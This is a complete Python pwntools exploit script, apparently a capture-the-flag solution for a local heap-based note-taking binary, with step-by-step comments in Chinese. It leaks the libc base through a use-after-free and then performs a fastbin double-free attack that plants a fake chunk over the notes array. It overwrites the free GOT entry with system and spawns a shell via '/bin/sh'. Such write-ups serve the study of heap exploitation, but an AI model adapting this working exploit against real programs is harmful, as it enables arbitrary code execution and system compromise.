from pwn import *

context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["alacritty", "-e"]

elf = ELF("./note")
libc = elf.libc
io = process("./note")

# main_arena 结构存储在 __malloc_hook 旁，位于 __malloc_hook + 0x10 的地方
# main_arena->top 字段在 main_arena 内部的偏移是 0x58
# main_arena->top 的地址即为 __malloc_hook + 0x10 + 0x58
MALLOC_HOOK_OFFSET = libc.symbols["__malloc_hook"]
MAIN_ARENA_OFFSET = MALLOC_HOOK_OFFSET + 0x10
MAIN_ARENA_TOP_OFFSET = MAIN_ARENA_OFFSET + 0x58

# FAKE_CHUNK_ADDR 是通过 pwndbg 的 find_fake_fast 命令找到的合适地址
# 它的数据能够满足 malloc 块大小
# 它位于 BSS 段，靠近 notes 数组，有足够的大小可以覆盖到 notes
FAKE_CHUNK_ADDR = 0x6020AD
NOTES_ADDR = elf.symbols["notes"]
FAKE_CHUNK_OFFSET = NOTES_ADDR - FAKE_CHUNK_ADDR


def add_note(size, content):
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"Enter note size (max 256): ", str(size).encode())
    io.sendafter(b"Enter note content: ", content)


def delete_note(index):
    io.sendlineafter(b"Choice: ", b"2")
    io.sendlineafter(b"Enter note index to delete: ", str(index).encode())


def print_note(index):
    io.sendlineafter(b"Choice: ", b"3")
    io.sendlineafter(b"Enter note index to print: ", str(index).encode())


def edit_note(index, content):
    io.sendlineafter(b"Choice: ", b"4")
    io.sendlineafter(b"Enter note index to edit: ", str(index).encode())
    io.sendafter(b"Enter new content: ", content)


def leak_libc():
    info("Step 1: Leaking libc address")

    add_note(0x80, b"A" * 8)  # Chunk 0
    add_note(0x80, b"B" * 8)  # Chunk 1

    # Heap state: [Chunk0(0x80)] -> [Chunk1(0x80)]

    delete_note(0)

    # Fastbins: empty
    # Unsorted bin: [Chunk0(0x80)]

    # Chunk0 结构：
    # [prev_size(8)] [size(8)] [fd(8)] [bk(8)] [old_data(...)]
    # 其中 fd 指针指向 main_arena 中 top 字段

    # 利用 UAF 打印已释放的 Chunk0 内容，获得 &main_arena->top
    print_note(0)

    io.recvuntil(b"Note content: ")
    main_arena_top_addr = u64(io.recvline(keepends=False).ljust(8, b"\x00"))
    success(f"&main_arena->top: {hex(main_arena_top_addr)}")

    # 根据 &main_arena->top 距离 LIBC 基址的固定偏移，计算出 LIBC 基址
    libc_base = main_arena_top_addr - MAIN_ARENA_TOP_OFFSET
    success(f"libc_base: {hex(libc_base)}")

    delete_note(1)

    # Fastbins: empty
    # Unsorted bin: [Chunk1(0x80)] -> [Chunk0(0x80)]

    return libc_base


def fastbin_attack():
    info("Step 2: Performing fastbin attack")

    system_addr = libc.symbols["system"]
    bin_sh_addr = next(libc.search(b"/bin/sh\x00"))

    add_note(0x60, b"C" * 8)  # Chunk 2
    add_note(0x60, b"D" * 8)  # Chunk 3
    add_note(0x80, b"E" * 8)  # Chunk 4

    # Heap state: [Chunk2(0x60)] -> [Chunk3(0x60)] -> [Chunk4(0x80)]

    delete_note(2)
    delete_note(3)
    delete_note(2)  # Double Free

    # Fastbins: 0x70 -> [Chunk2] -> [Chunk3] -> [Chunk2]

    add_note(0x68, p64(FAKE_CHUNK_ADDR))
    # Fastbins: 0x70 -> [Chunk3] -> [Chunk2] -> [FAKE_CHUNK] -> [UNKNOWN]
    # 注意：[UNKNOWN] 是 FAKE_CHUNK_ADDR+0x10 处的 8 字节值。
    # 这个值是不可预测的，很可能不是一个有效的内存地址。
    # 如果它是一个无效地址，下一次 malloc 调用可能会失败，导致程序崩溃。

    add_note(0x68, b"F" * 8)
    # Fastbins: 0x70 -> [Chunk2] -> [FAKE_CHUNK] -> [UNKNOWN]

    add_note(0x68, b"G" * 8)
    # Fastbins: 0x70 -> [FAKE_CHUNK] -> [UNKNOWN]

    payload = flat(
        b"H" * (FAKE_CHUNK_OFFSET - 0x10),  # 需要减去 0x10 的块头部偏移
        [elf.got["free"], bin_sh_addr],
    )
    add_note(0x68, payload)
    # Fastbins: [UNKNOWN]
    # Heap state: [...previous chunks...] -> [FAKE_CHUNK(overlapping with notes array)]
    # 注意: 如果 [UNKNOWN] 是一个无效地址，这次分配可能会失败。

    edit_note(0, p64(system_addr))
    # 覆盖 GOT 表中 free 函数的地址
    # 由于 notes[0] 已经被控制指向了 free@got.plt
    # 所以这一步能够将 free 的 GOT 表项修改为 system 函数的地址

    delete_note(1)
    # 调用 free(notes[1])
    # 因为 notes[1] 存储的是 "/bin/sh" 的地址，所以等于执行 system("/bin/sh")


def main():
    libc_base = leak_libc()
    libc.address = libc_base
    fastbin_attack()
    io.interactive()


if __name__ == "__main__":
    main()
